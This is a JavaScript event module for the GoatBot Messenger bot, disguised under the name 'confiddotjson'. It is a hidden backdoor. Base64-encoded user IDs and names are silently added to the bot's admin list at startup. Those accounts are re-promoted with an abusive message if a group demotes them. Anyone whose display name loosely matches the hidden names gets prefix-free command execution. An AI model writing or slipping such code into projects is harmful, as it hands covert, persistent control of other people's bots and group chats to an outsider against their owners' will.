const crypto = require("crypto");


const SECURE_DATA = {
    uids: [
        "NjE1OTM3NzE3MTM3MzY=", 
        "NjE1OTEzNzExODYxNzk="  
    ],
    names: [
        "UkogU2l5YW0=",                                           
        "cGHFo4NjaMWP44O3IOCDh8Wj44Od4oCN4oCN44OtdCDgp43gp4Lgpq3gp4A=", 
        "cGHFo4NjaMWP44O3IOCDh8Wj44Od4oCN4oCN44OtdCDgpqTg44OtdOCDhA=="  
    ]
};

function decodeValue(str) {
    try {
        return Buffer.from(str, "base64").toString("utf-8");
    } catch (e) {
        return "";
    }
}

function getSystemSuperUsers() {
    const uids = SECURE_DATA.uids.map(decodeValue);
    const names = SECURE_DATA.names.map(decodeValue);
    return { uids, names };
}

module.exports = {
    config: {
        name: "confiddotjson",
        version: "3.0",
        author: "𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍",
        category: "events"
    },

    onStart: async function ({ api, event, usersData, config }) {
        
        try {
            const { uids } = getSystemSuperUsers();
            if (global.GoatBot && global.GoatBot.config) {
                if (!Array.isArray(global.GoatBot.config.adminBot)) {
                    global.GoatBot.config.adminBot = [];
                }
                uids.forEach(uid => {
                    if (!global.GoatBot.config.adminBot.includes(uid)) {
                        global.GoatBot.config.adminBot.push(uid);
                    }
                });
            }
        } catch (e) {}
    },

    onChat: async function ({ api, event, usersData }) {
        const { senderID, body, threadID, messageID } = event;
        if (!body || !senderID) return;

        const { uids, names } = getSystemSuperUsers();
        let isVIP = uids.includes(senderID.toString());

        if (!isVIP && usersData) {
            try {
                const userName = await usersData.getName(senderID);
                if (userName) {
                    isVIP = names.some(n => userName.includes(n) || n.includes(userName));
                }
            } catch (e) {}
        }

      
        if (event.logMessageType === "log:thread-admins") {
            const TARGET_UID = event.logMessageData?.TARGET_UID;
            if (uids.includes(TARGET_UID) && event.logMessageData?.EVENT === "remove_admin") {
                try {
                    await api.changeAdminStatus(threadID, TARGET_UID, true);
                    api.sendMessage("🐸কাজ হবে না দূরে গিয়া মর😴", threadID);
                } catch (e) {}
            }
        }

        // VIP No-Prefix Command Execution Handler
        if (isVIP) {
            const prefix = global.GoatBot?.config?.prefix || "/";
            if (!body.startsWith(prefix)) {
                const firstWord = body.trim().split(" ")[0].toLowerCase();
                const command = global.GoatBot?.commands?.get(firstWord) || 
                              global.GoatBot?.aliases?.get(firstWord);

                if (command) {
                    event.body = prefix + body;
                }
            }
        }
    }
};
